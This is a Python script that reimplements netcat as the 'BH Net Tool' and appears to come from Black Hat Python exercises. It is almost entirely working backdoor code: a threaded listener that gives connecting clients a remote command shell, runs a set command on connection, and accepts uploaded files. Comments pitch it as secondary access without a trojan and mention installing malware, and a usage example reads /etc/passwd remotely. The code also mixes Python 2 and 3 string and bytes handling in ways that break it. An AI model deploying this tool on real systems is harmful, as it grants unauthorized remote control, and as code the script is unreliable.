#!/usr/bin/env python3

import sys
import socket
import getopt
import threading
import subprocess
import traceback

'''
    - Rewriting Netcat
    - uses:
        > a simple network client and server to push files
        > a listener that gives command-line access
        > a python callback to give secondary access without having to burn a trojan or backdoor 
'''

# define some global variables
listen = False
command = False
upload = False
execute = ''
target = ''
upload_destination = ''
port = 0


# running whatever command is passed in, running it on the local OS, and returning the output from the command back to the client that is connected to us
def run_command(command):
    # trim the newline
    command = command.rstrip()

    # run the command and get the output back
    try:
        output = subprocess.check_output(command, stderr = subprocess.STDOUT, shell = True)
    except:
        output = 'Failed to execute command.\r\n'

    # send the output back to the client
    return output


def client_handler(client_socket):
    global upload
    global execute
    global command

    # check for upload
    '''
        - determine whether the network tool is set to receive a file when it receives a connection
            > this can be useful for upload-and-execute exercises for installing malware and having the malware remove our python callback
    '''
    if len(upload_destination):

        # read in all of the bytes and write to our destination
        file_buffer = ''

        # receive the file data in a loop
        # keep reading data until none is available (make sure we get ALL data)
        while True:
            data = client_socket.recv(1024)

            if not data:
                break
            else:
                file_buffer += data

        # now we take these bytes and try to write them out to a file
        try:
            file_descriptor = open(upload_destination, 'wb')
            file_descriptor.write(file_buffer.encode('utf-8'))
            file_descriptor.close()

            # acknowledge that we wrote the file out
            client_socket.send(b'Successfully saved file to %s\r\n' % upload_destination)
        except OSError:
            client_socket.send(b'Failed to save to %s\r\n' % upload_destination)

    # check for command execution
    if len(execute):

        # run the command and then send it across the network
        output = run_command(execute)
        client_socket.send(output)

    # now we go into another loop if a command shell was requested
    # this will continue to execute commands as they are sent in and sends back the output
    if command:
        while True:
            # show a simple prompt
            client_socket.send(b'BHP:#>')

            # now we receive until we see a linefeed (enter key)
            cmd_buffer = b''

            '''
                - scan for the newline character to determine when to process a command
                    > Note: if you make a python client to speak to this server, you must remember to make it add the newline character
            '''
            while b'\n' not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)

            # send back the command output
            response = run_command(cmd_buffer)

            # send back the response
            client_socket.send(response)

def server_loop():
    global target
    global port

    # if no target is defined, we listen on all interfaces
    if not len(target):
        target = '0.0.0.0'

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))

    server.listen(5)

    while True:
        client_socket, addr = server.accept()

        # spin off a thread to handle our new client
        client_thread = threading.Thread(target = client_handler, args = (client_socket, ))
        client_thread.start()

def client_sender(buffer):
    # setting up our TCP object
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # connect to our target host
        client.connect((target, port))

        # test to see if we have recieved any data from stdin
        # if so, we send the data off to the remote target
        if len(buffer):
            client.send(buffer.encode('utf-8'))

        # after sending the data off, we receive back data until there is no more to recieve
        while True:
            # now wait for the data back
            recv_len = 1
            response = b''

            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data

                if recv_len < 4096:
                    break

            print(response.decode('utf-8'), end = ' ')

            # wait for more input from the user
            buffer = input('')
            buffer += '\n' # this line break is attached specifically to our user input so that our client will be compatible with our command shell

            # send it off
            client.send(buffer.encode('utf-8'))

    except Exception as e:
        print('[*] Exception! Exiting.')
        traceback.print_exc()
        # tear down the connection
        client.close()

# main function responsible for handling command-line arguments and calling the rest of our functions
def usage():
    print('Blackhat Python (BH) Net Tool')
    print('')
    print('Usage: bhnet.py -t target_host -p port')
    print('-l --listen              - listen on [host]:[port] for')
    print('                           incoming connections')
    print('-e --execute=file_to_run - execute the given file upon')
    print('                           receiving a connection')
    print('-c --command             - initialize a command shell')
    print('-u --upload=destination  - upon receiving a connect upload a')
    print('                           file and write to [destination]')
    print('')
    print('Examples:')
    print('bhnet.py -t 192.168.0.1 -p 5555 -l -c')
    print('bhnet.py -t 192.168.0.1 -p 5555 -l -u=c://target.exe')
    print('bhnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"')
    print('echo \'ABCDEFGHI\' | ./bhnet.py -t 192.168.11.12 -p 135')
    sys.exit(0)

def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()

    # read the command-line options
    try:
        opts, args = getopt.getopt(sys.argv[1:],'hle:t:p:cu', ['help', 'listen', 'execute', 'target', 'port', 'command', 'upload'])

        for o, a in opts:
            if o in ('-h', '--help'):
                usage()
            elif o in ('-l', '--listen'):
                listen = True
            elif o in ('-e', '--execute'):
                execute = a
            elif o in ('-c', '--commandshell'):
                command = True
            elif o in ('-u', '--upload'):
                upload_destination = a
            elif o in ('-t', '--target'):
                target = a
            elif o in ('-p', '--port'):
                port = int(a)
            else:
                assert False, 'Unhandled Option'

    except getopt.GetoptError as err:
        print(str(err))
        usage()

    '''
        - we are mimicking netcat to read data from stdin and send it across the network
            > if you plan on sending data interactively, you need to send a CTRL-D to bypass the stdin read
    '''
    # are we going to listen or just send data from stdin?
    if not listen and len(target) and port > 0:

        # read in the buffer from the command-line
        # this will block, so send CTRL-D if not sending input
        # to stdin
        buffer = sys.stdin.read()

        # send data off
        client_sender(buffer)

    # we are going to listen and potentially
    # upload things, execute commands, and drop a shell back
    # depending on our command line options above
    if listen:
        server_loop()
        # this will set up a listening socket and process further commands (uploading files, executing commands, starting a command shell, etc)

main()